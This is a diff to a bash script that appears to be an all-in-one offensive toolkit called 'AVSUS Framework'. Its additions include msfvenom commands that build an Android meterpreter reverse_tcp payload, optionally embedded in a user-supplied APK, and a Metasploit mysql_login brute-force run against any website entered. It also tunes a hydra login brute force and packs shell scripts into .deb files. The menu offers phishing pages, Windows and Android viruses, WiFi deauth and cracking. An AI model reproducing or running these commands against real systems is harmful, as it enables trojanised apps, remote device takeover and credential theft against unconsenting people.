@@ -1,10 +1,15 @@
 #!/bin/bash
 
+
+own_ip=$(hostname -I | awk '{ print $1 }')
+NEW_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)
+
+main_banner() {
+clear
 chars="/-\|"
 timeout=3
 start=$(date +%s)
 
-clear
 ##############################color
 m="\e[0;31m"      # merah           # red
 k="\e[0;33m"      # kuning          # yellow
@@ -27,7 +32,7 @@ _________________________________________________________________________
 |		  _       ___     ______            .                    |
 |		 | |     / \ \   / / ___| _   _ ___                    . |
 |		/ __)   / _ \ \ / /\___ \| | | / __|                     |
-|	.	\__ \  / ___ \ V /  ___) | |_| \__ SUPER         .       |
+|	.	\__ \  / ___ \ V /  ___) | |_| \__FUTURE         .       |
 |        	(   / /_/   \_\_/  |____/ \__,_|___/                     |
 |  		 |_|                                                     |
 |.                               |            .                     o    |
@@ -55,6 +60,11 @@ while :; do
   done
 done
 
+echo -e "\033[34m
+[+] DEVICE INFO-:
+[+] PRIVATE IP: $own_ip
+[+] PUBLIC IP: $NEW_DEVICE_PUBLIC_IP 
+\033[0m"
 
 packages=("figlet" "wget" "adb" "nmap" "festival")
 
@@ -93,6 +103,7 @@ ${n}" | lolcat
 echo -e "\n\n\n"
 
 
+
 echo -e "\033[34m
 <--------------------------------------------------------------------------->
 | [-] $ AVSUS FRAMEWORK                                                     |
@@ -102,6 +113,7 @@ echo -e "\033[34m
 | [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
 <--------------------------------------------------------------------------->
 \033[0m"
+
 
 
 echo -e "\n\n\n"
@@ -137,10 +149,105 @@ echo "[28] DOWNLOAD MEGA.nz LINK QUICKLY" | lolcat
 echo "[29] CREATE A PHISING PAGE" | lolcat
 echo "[tnl] CREATE A TUNNEL" | lolcat
 echo "[30] WEBSITE BRUTEFORCE" | lolcat
+echo "[mbrute] METASPLOIT WEBSITE BRUTE FORCE" | lolcat
 echo "[31] SETUP WIFI WITH MONITOR MODE" | lolcat
 echo "[32] CAPTURE CAP FILE OF WIFI" | lolcat
 echo "[33] DEAUTH THE WIFI" | lolcat
+echo "[34] CREATE A DEB FILE {SHELL TO PACKAGE}" | lolcat
 echo "[99] ADDITIONAL commands" | lolcat
+
+}
+
+show_help() {
+    echo "Usage: Avstool [options]"
+    echo "Options:"
+echo -e "\033[34m
+<--------------------------------------------------------------------------->
+| [-] $ AVSUS FRAMEWORK                                                     |
+|                                                                           |
+| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
+| [+] EMAIL: kanishkasingh0885@gmail.com                                    |
+| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
+<--------------------------------------------------------------------------->
+
+Options:
+[+] usr
+[1] 4-PIN BRUTE FORCE ATTACK
+[2] 6-PIN BRUTE FORCE ATTACK
+[3] 10-PIN BRUTE FORCE ATTACK
+[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT
+[5] OPEN 5555 PORT OF CONNECT DEVICE
+[6] IP DETAILS
+[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE
+[8] REMOVE LOCKSCREEN
+[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE
+[11] INSTALL TELEGRAM,SPOTIFY
+[12] INSTALL PACKAGES
+[13] PHONEINFOS
+[14] SCAN A FILE FOR VIRUSES
+[15] SCAN A WEBSTIE FOR PHISING PAGE
+[16] FULL SCAN THIS PC
+[17] CREATE A VIRUS FOR ANDROID
+[18] CREATE A VIRUS FOR WINDOWS
+[19] MAC OS FOR KALI LINUX
+[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI
+[21] CREATE A FAKE WIFI POINT
+[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI
+[23] TEST THE WIFI INTERFACE FOR HACKING
+[24] DOWNLOAD SPOTIFY MUSIC USING URL
+[25] DOWNLOAD YOUTUBE VIDEO
+[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT
+[27] DOWNLOAD GDRIVE LINKS QUICKLY
+[28] DOWNLOAD MEGA.nz LINK QUICKLY
+[29] CREATE A PHISING PAGE
+[tnl] CREATE A TUNNEL
+[30] WEBSITE BRUTEFORCE
+[mbrute] METASPLOIT WEBSITE BRUTE FORCE
+[31] SETUP WIFI WITH MONITOR MODE
+[32] CAPTURE CAP FILE OF WIFI
+[33] DEAUTH THE WIFI
+[34] CREATE A DEB FILE {SHELL TO PACKAGE}
+[avs q] quiet mode, direcly on work.
+[g] GRAPHICAL
+[h] help
+\033[0m"
+}
+
+add_commands() {
+
+echo -e "\033[34m
+
+[+] 'install chrome' TO INSTALL GOOGLE CHROME
+[+] 'install edge' TO INSTALL MICROSOFT EDGE
+[+] 'install virtual box' TO INSTALL VIRTUAL BOX
+[+] 'install spotify' TO INSTALL SPOTIFY
+
+\033[0m"
+
+}
+
+# Parse the command line options
+while getopts "h" opt; do
+    case $opt in
+        h)
+            clear
+            show_help
+            exit 0
+            ;;
+        \?)
+            show_help
+            exit 1
+            ;;
+    esac
+done
+
+# Parse the command line options
+if [[ $1 == "q" ]]; then
+    echo ""
+    else
+        main_banner
+fi
+
 
 echo -e "\n\n\n"
 
@@ -192,6 +299,9 @@ process_input() {
         ;;
         "is ant your brother" | "is Ant your elder brother" | "is ant your brother" | "is Ant your brother")
         echo "Yes Ant is my elder brother he was created by python on Good friday 2023"
+        ;;
+        h)
+        show_help
         ;;
         1)
             echo "[+] STARTING 4-PIN BRUTE FORCE" | lolcat
@@ -290,6 +400,12 @@ process_input() {
 	# Download the file
 	gdown "$gdrive_link"
         ;;
+        "g")
+        main_banner
+        ;;
+        "graphics")
+        main_banner
+        ;;
         28)
 	if ! command -v megadl &>/dev/null; then
 	    echo "megatools is not found. Installing megatools..."
@@ -368,6 +484,38 @@ process_input() {
                 fi
             done
         ;;
+        34)
+        echo "Enter the name of your package:"
+        read package_name
+
+        echo "Enter the version of your package:"
+        read package_version
+
+        echo "Enter the path to your shell script:"
+        read script_path
+
+        # Create the package directory structure
+        package_dir="${package_name}_${package_version}"
+        mkdir -p "$package_dir/DEBIAN"
+        mkdir -p "$package_dir/usr/bin"
+
+        # Create the control file
+        control_file="$package_dir/DEBIAN/control"
+        echo "Package: $package_name" > $control_file
+        echo "Version: $package_version" >> $control_file
+        echo "Section: base" >> $control_file
+        echo "Priority: optional" >> $control_file
+        echo "Architecture: all" >> $control_file
+        echo "Maintainer: Your Name <your.email@example.com>" >> $control_file
+        echo "Description: Your package description" >> $control_file
+
+        # Copy the script to the package directory
+        cp "$script_path" "$package_dir/usr/bin/$package_name"
+        chmod 755 "$package_dir/usr/bin/$package_name"
+
+        # Build the package
+        dpkg-deb --build "$package_dir"
+        ;;
         4)
         echo "[+] DOWNLOADING ALL REQUIRED COMPONENTS" | lolcat
         echo "[+] KINDLY ENABLE ROOT MODE" | lolcat
@@ -379,6 +527,42 @@ process_input() {
         sudo apt install pip
         sudo apt install lolcat
         echo "[-] INSTALLED COMPLETELY" | lolcat
+        ;;
+        mbrute)
+        echo "[+] THIS MAY NOT WORK STILL UNDER DEVLOPMENT"
+        read -p "[+] ENTER WEBSITE ADDRESS: " domain
+
+        # Find IP of domain
+        ip=$(dig +short $domain)
+        echo "[+] WEBSITE IP: $ip"
+
+        # Prompt user for username or username file
+        read -p "[+] SINGLE USERNAME OR USERNAME FILE [u/f]: " choice
+
+        if [ "$choice" == "u" ]; then
+            read -p "Enter username: " username
+            user_option="USERNAMES=$username"
+        elif [ "$choice" == "f" ]; then
+            read -p "Enter path to username file: " user_file
+            usernames=$(cat $user_file | tr '\n' ',')
+            user_option="USERNAMES=$usernames"
+        else
+            echo "Invalid choice"
+            exit 1
+        fi
+
+        # Prompt user for password file
+        read -p "Enter path to password file: " pass_file
+
+        # Set additional options
+        blank_passwords="true"
+        bruteforce_speed="5"
+        stop_on_success="false"
+        threads="1"
+        verbose="true"
+
+        # Open msfconsole and run auxiliary/scanner/mysql/mysql_login module
+        msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS $ip; set RPORT 3306; set PASS_FILE $pass_file; set $user_option; set BLANK_PASSWORDS $blank_passwords; set BRUTEFORCE_SPEED $bruteforce_speed; set STOP_ON_SUCCESS $stop_on_success; set THREADS $threads; set VERBOSE $verbose; exploit; exit"
         ;;
         5)
         echo "[+] STARTING 5555 PORTS ON CONNECTED DEVICE" | lolcat
@@ -467,7 +651,7 @@ process_input() {
         echo "[+] IP OF WEB ==> $ip"
         echo "Starting brute-force attack..."
 
-        hydra -l $username -P $wordlist $ip http-get /login
+        hydra -l $username -P $wordlist $ip http-get /login -V
 
         if [ $? -eq 0 ]; then
         echo "Brute force attack successful! Username: $username, Password found in $wordlist"
@@ -513,6 +697,9 @@ process_input() {
         echo "[+] INSTALLING TELEGRAM..." | lolcat
         sudo apt install telegram-desktop
         echo "[+] INSTALLED TELEGRAM COMPLETELY [✓]"
+        ;;
+        "b")
+        main_banner
         ;;
         12)
         echo "[+] INSTALLING FIGLET" | lolcat
@@ -635,7 +822,15 @@ process_input() {
         17)
         echo "[+] CREATING PAYLOAD FOR ANDROID..." | lolcat
         own_ip=$(hostname -I | awk '{ print $1 }')
+        read -p "[+] YOUR SOFTWARE DESTINATION (ENTER IF NO):" software_destination
+
+        if [[ -n $software_destination ]]; then
+        # Execute command with software destination
+        msfvenom -x $software_destination -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
+        else
+        # Execute command without software destination
         msfvenom -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
+        fi
         echo "[+] PAYLOAD CREATED: Avs-andropayload.apk " | lolcat        
         echo "[-] STARTING APACHE2 SERVICE..." | lolcat
         service apache2 start
@@ -721,27 +916,8 @@ process_input() {
         gnome-tweaks
         ;;
         "99")
-	echo "[+] COMMANDS:" | lolcat
-	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
-	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
-	echo "[6] IP DETAILS" | lolcat
-	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
-	echo "[8] REMOVE LOCKSCREEN" | lolcat
-	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
-	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
-	echo "[12] INSTALL PACKAGES" | lolcat
-    echo "[13] PHONEINFOS" | lolcat
-    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
-        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
-        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
-        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
-        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
-        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
-        echo "[+] BOT TO PERSON COMMANDS" | lolcat
-        echo -e "\n\n"
+        show_help
+        add_commands
         ;;
         20)
 	default_interface="wlan0"
@@ -927,27 +1103,8 @@ process_input() {
         echo -e "\n\n"
         ;;
         "help")
-	echo "[+] COMMANDS:" | lolcat
-	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
-	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
-	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
-	echo "[6] IP DETAILS" | lolcat
-	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
-	echo "[8] REMOVE LOCKSCREEN" | lolcat
-	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
-	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
-	echo "[12] INSTALL PACKAGES" | lolcat
-    echo "[13] PHONEINFOS" | lolcat
-    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
-        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
-        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
-        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
-        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
-        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
-        echo "[+] BOT TO PERSON COMMANDS" | lolcat
-        echo -e "\n\n"
+        show_help 
+        add_commands
         ;;
         "ok cheer me up")
         echo "SIR YOU'RE THE BEST BECAUSE OF YOU I AM HERE, THANKYOU"
@@ -985,12 +1142,56 @@ process_input() {
         "how old are you")
             echo "I'm a program, so I don't have an age like humans do. I'm always up-to-date!"
             ;;
+        "what is hacking")
+            echo "[+] Hacking is the process of gaining unauthorized access to a computer system or network. Hackers can use this access to steal data, install malware, or disrupt operations.";
+        ;;
+
+        "what is Linux")
+            echo "[+] Linux is a free and open-source operating system. It is based on Unix and is used by millions of people around the world. Linux is known for its stability, security, and flexibility.";
+        ;;
+
+        "what is Kali Linux")
+            echo "[+] Kali Linux is a penetration testing distribution of Linux. It is used by security professionals to test the security of computer systems and networks. Kali Linux includes a wide range of tools for penetration testing, such as Nmap, Wireshark, and Metasploit.";
+        ;;
+
+        "what is Gnome")
+            echo "[+] Gnome is a graphical user interface (GUI) for Linux. It is one of the most popular GUIs for Linux and is used by many distributions, such as Ubuntu and Fedora.";
+        ;;
+
+        "what is LightDM")
+            echo "[+] LightDM is a display manager for Linux. It is responsible for displaying the login screen and managing user sessions.";
+        ;;
+
+        "kali vs parrot")
+            echo "[+] Kali Linux and Parrot OS are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. Kali Linux is more focused on security testing, while Parrot OS is more focused on general-purpose use. Kali Linux also has a larger community of users and developers, while Parrot OS is a newer distribution with a smaller community.";
+        ;;
+
+        "black arch vs kali linux")
+            echo "[+] BlackArch Linux and Kali Linux are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. BlackArch Linux has a larger repository of tools than Kali Linux, while Kali Linux is more user-friendly. BlackArch Linux is also a newer distribution than Kali Linux, so it may not be as stable or secure.";
+        ;;
+        "types of linux")
+            echo "[+] There are many different types of Linux distributions available. Some of the most popular distributions include Ubuntu, Fedora, Debian, and openSUSE. Each distribution has its own strengths and weaknesses, so it is important to choose a distribution that is right for your needs.";
+        ;;
         "do you have any hobbies")
             echo "As a digital assistant, my purpose is to assist and provide information. So, my 'hobby' is helping people!"
             ;;
         "what's the weather like today")
             echo "I'm sorry, I don't have real-time information. But you can check a weather website or app to get the current weather updates."
             ;;
+        "types of hacking")
+        echo "[+] Brute force attacks: This involves trying every possible combination of characters until the correct password is found.
+
+[+] Dictionary attacks: This involves using a list of common passwords to try to gain access to a system.
+
+[+] Social engineering attacks: This involves tricking the victim into giving up their personal information or clicking on a malicious link.
+
+[+] Phishing attacks: This involves sending emails or text messages that appear to be from a legitimate source, such as a bank or credit card company. The emails or text messages will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website.
+ Once the victim enters their personal information on the fake website, the hacker can steal it.
+[+] Malware attacks: This involves installing malware on a victim's computer. Malware can be installed through a variety of ways,
+ such as clicking on a malicious link, opening an infected attachment, 
+or downloading a file from an untrusted source. Once malware is installed on a computer,
+ it can steal data, install other malware, or disrupt operations."
+        ;;
         "do you like music")
             echo "I don't have personal preferences, but I can definitely help you find information about different types of music!"
             ;;
@@ -1045,13 +1246,62 @@ process_input() {
         "What is a black hole")
             echo "A black hole is a region of spacetime exhibiting gravitational acceleration so strong that nothing—no particles or even electromagnetic radiation such as light—can escape from it."
         ;;
-        "What is electricity")
+        "what is the terminal in kali linux")
+            echo "[+] The terminal is a command-line interface (CLI) that allows you to interact directly with the operating system. You can use the terminal to run commands, manage files, and troubleshoot problems."
+        ;;
+
+        "what is the best tool for hackers")
+            echo "[+] There is no one-size-fits-all answer to this question. The best tool for hackers will vary depending on the specific task they are trying to accomplish. However, some of the most popular tools for hackers include Nmap, Wireshark, and Metasploit."
+        ;;
+
+        "how do i learn ethical hacking")
+            echo "[+] There are many resources available to help you learn ethical hacking. You can find books, articles, and tutorials online. You can also find ethical hacking courses and boot camps. The most important thing is to start learning and practicing as soon as possible."
+        ;;
+        "what is a black hat hacker")
+        echo "[+] A black hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to harm or steal data. Black hat hackers are often motivated by financial gain or political ideology."
+        ;;
+
+        "what is a white hat hacker")
+        echo "[+] A white hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to improve security. White hat hackers are often employed by security companies or government agencies to test the security of their systems."
+        ;;
+
+        "what is a grey hat hacker")
+        echo "[+] A grey hat hacker is a hacker who falls somewhere between black hat and white hat hackers. Grey hat hackers may gain unauthorized access to a computer system or network without permission, but they do not intend to harm or steal data. Grey hat hackers often share their findings with the system owners in order to help them improve their security."
+        ;;
+
+        "what is a script kiddie")
+        echo "[+] A script kiddie is a hacker who uses pre-made tools and scripts to attack computer systems. Script kiddies are often unskilled and inexperienced, and they often target vulnerable systems. Script kiddies are not typically considered to be serious threats to security."
+        ;;
+
+        "what is a nation state actor")
+        echo "[+] A nation state actor is a government-funded group that uses hacking to achieve political or economic goals. Nation state actors are often very sophisticated and well-funded, and they pose a serious threat to security."
+        ;;
+
+        "what is a botnet")
+        echo "[+] A botnet is a network of computers that have been infected with malware and are controlled by a single attacker. Botnets can be used to carry out a variety of attacks, including denial-of-service attacks, spam campaigns, and data theft."
+        ;;
+
+        "what is a DDoS attack?")
+        echo "[+] A DDoS attack is a distributed denial-of-service attack. In a DDoS attack, a large number of computers are used to flood a target website or server with requests, making it impossible for legitimate users to access it. DDoS attacks can be used to bring down websites, disrupt businesses, and interfere with critical infrastructure."
+        ;;
+
+        "what is a phishing attack?")
+        echo "[+] A phishing attack is a type of social engineering attack in which the attacker sends an email or text message that appears to be from a legitimate source. The email or text message will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website. Once the victim enters their personal information on the fake website, the attacker can steal it."
+        ;;
+        "what are some of the ethical hacking certifications available")
+            echo "[+] There are many ethical hacking certifications available. Some of the most popular certifications include the Certified Ethical Hacker (CEH), the Offensive Security Certified Professional (OSCP), and the Certified Information Systems Security Professional (CISSP). These certifications can help you demonstrate your skills and knowledge to potential employers."
+        ;;
+
+        "how can I stay up-to-date on the latest hacking techniques")
+            echo "[+] The best way to stay up-to-date on the latest hacking techniques is to read security blogs and articles, attend security conferences, and participate in security mailing lists and forums. You can also follow security researchers on Twitter and other social media platforms."
+        ;;
+        "what is electricity")
             echo "Electricity is a form of energy resulting from the movement of charged particles (such as electrons or protons), typically through a wire or other conductor."
         ;;
-        "What is a molecule")
+        "what is a molecule")
             echo "A molecule is an electrically neutral group of two or more atoms held together by chemical bonds. Molecules are distinguished from ions by their lack of electrical charge."
         ;;
-        "What is a chemical reaction")
+        "what is a chemical reaction")
             echo "A chemical reaction is a process that leads to the transformation of one set of chemical substances to another. Chemical reactions can be represented by chemical equations."
         ;;
         "i am in which file")
@@ -1126,17 +1376,9 @@ process_input() {
 
     esac
 }
-
-# Main loop to process user input
-#while true; do
-#    echo -e "\n\n"
-#    echo "┌──($ AVSUS㉿X)-[v2.0]" | lolcat
-#    read -p "└──$" input 
-#    process_input "$input"
-#done
 while true; do
     echo -e "\n\n"
-    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[v2.2]\033[0m"
+    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[v2.1]\033[0m"
     read -p "└──[$] " input 
     process_input "$input"
 done
